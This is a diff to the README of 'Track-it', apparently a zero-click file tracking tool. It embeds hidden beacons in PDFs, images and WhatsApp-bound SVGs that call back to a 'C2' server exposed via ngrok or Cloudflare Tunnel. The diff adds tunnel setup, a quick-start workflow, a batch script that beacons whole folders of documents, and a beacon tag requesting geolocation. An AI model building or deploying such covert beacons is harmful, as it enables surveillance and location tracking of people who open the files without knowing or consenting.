@@ -1,4 +1,4 @@
-# 📖 Zero-Click File Tracker
+# 📖 Track-it: Zero-Click File Tracker
 
 <div align="center">
   <img src="https://img.shields.io/badge/Status-Production%20Ready-brightgreen" alt="Status">
@@ -90,7 +90,7 @@ python3 c2.py
 **Dashboard Features:**
 - Live hits (3s auto-refresh)
 - Platform stats (WhatsApp/PDF/Win)
-- Export: `sqlite3 c2_hits.db "SELECT * FROM hits;" > report.csv`
+- Export: `sqlite3 data/c2_hits.db "SELECT * FROM hits;" > report.csv`
 
 ### **Step 2: Expose to Internet** (Pick **1**)
 
@@ -104,6 +104,70 @@ python3 c2.py
 ```
 ngrok http 8080
 # Forwarding  https://abc123.ngrok.io → localhost:8080
+```
+
+#### **Option A: Ngrok (install + config)**
+
+```bash
+# 1. Download & signup (free)
+curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc
+echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list
+sudo apt update && sudo apt install ngrok
+
+# 2. Get FREE token from https://dashboard.ngrok.com/get-started/your-authtoken
+ngrok config add-authtoken YOUR_TOKEN_FROM_NGROK_DASHBOARD
+
+# 3. (Optional) Create config file
+cat > tunnels/ngrok.yml << 'EOF'
+version: "2"
+authtoken: YOUR_ACTUAL_TOKEN_HERE
+tunnels:
+  tracker:
+    addr: 8080
+    proto: http
+EOF
+# Then run: ngrok start tracker
+```
+
+#### **Option B: Cloudflare Tunnel (install + config)**
+
+```bash
+# 1. Install
+wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
+chmod +x cloudflared
+sudo mv cloudflared /usr/local/bin/
+
+# 2. Create named tunnel
+cloudflared tunnel create tracker
+
+# 3. Create config (replace tracker-ID and path with your values)
+cat > tunnels/cloudflare.json << 'EOF'
+{
+  "tunnel": "tracker-ID-FROM-cloudflared",
+  "credentials-file": "/root/.cloudflared/YOUR_CREDENTIALS.json",
+  "ingress": [
+    {"hostname": "tracker.yourdomain.com", "service": "http://localhost:8080"},
+    {"service": "http_status:404"}
+  ]
+}
+EOF
+# Then run: cloudflared tunnel run tracker
+```
+
+#### **Quick path (no config — works immediately)**
+
+Uses only the existing scripts (`c2.py`, `track-it.py`) and ngrok—no `tunnels/` config needed.
+
+```bash
+# Terminal 1: C2 starts (c2.py)
+python3 c2.py
+
+# Terminal 2: Direct tunnel (no config file)
+ngrok http 8080
+# Copy the URL, e.g. https://abc123.ngrok.io
+
+# Terminal 3: Track a file (track-it.py; replace with your ngrok URL)
+python3 track-it.py test.pdf tracked.pdf --url https://abc123.ngrok.io/beacon
 ```
 
 ### **Step 3: Track Files**
@@ -145,7 +209,7 @@ python3 track-it.py photo.jpg whatsapp_photo.svg --url https://c2.ngrok.io/beaco
 ## 📊 **Live Dashboard**
 
 ```
-🎯 UNIVERSAL C2 DASHBOARD     [127 hits]
+🎯 Track-it C2 Dashboard     [127 hits]
 
 📈 STATS           Total: 127    WhatsApp: 64    PDF: 32    Windows: 21
 
@@ -218,11 +282,11 @@ BEACON_HTML = '<img src="{url}?id={id}&whatsapp=1&geolocation=1" width=1>'
 #!/bin/bash
 # track_all.sh
 C2_URL="https://abc123.ngrok.io/beacon"
-mkdir -p tracked_files
+mkdir -p data/tracked_files
 
 for file in documents/*.pdf images/*.jpg; do
   name=$(basename "$file")
-  python3 track-it.py "$file" "tracked_files/tracked_$name" --url "$C2_URL"
+  python3 track-it.py "$file" "data/tracked_files/tracked_$name" --url "$C2_URL"
 done
 ```
 
@@ -274,4 +338,4 @@ python3 track-it.py vuln.pdf tracked.pdf --url https://c2/beacon
 - **Ngrok**: https://ngrok.com/download
 - **Cloudflare Tunnel**: https://developers.cloudflare.com/cloudflare-one/
 - **SQLite Browser**: https://sqlitebrowser.org/
-- **GitHub**: https://github.com/hackerai/universal-tracker
+- **GitHub**: https://github.com/subrat243/Track-it
